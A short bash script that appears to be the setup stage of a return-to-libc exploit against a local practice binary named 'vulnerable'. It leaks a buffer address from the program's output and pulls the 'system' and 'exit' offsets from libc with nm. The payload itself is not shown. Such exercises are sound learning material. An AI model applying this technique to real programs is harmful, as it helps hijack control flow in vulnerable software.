#!/usr/bin/env bash

buffer_address=$(printf '%016x\n' $(echo | ./vulnerable | head -n1))
libc_system=$(nm -D /usr/lib/libc.so.6 | grep "\<system\>" | cut -d' ' -f1)
libc_exit=$(nm -D /usr/lib/libc.so.6 | grep "\<exit\>" | cut -d' ' -f1)

if [[ $DEBUG ]]; then
	echo "Buffer address: $buffer_address"
	echo "Libc system offset: $libc_system"
	echo "Libc exit offset: $libc_exit"
fi | column -t -s:
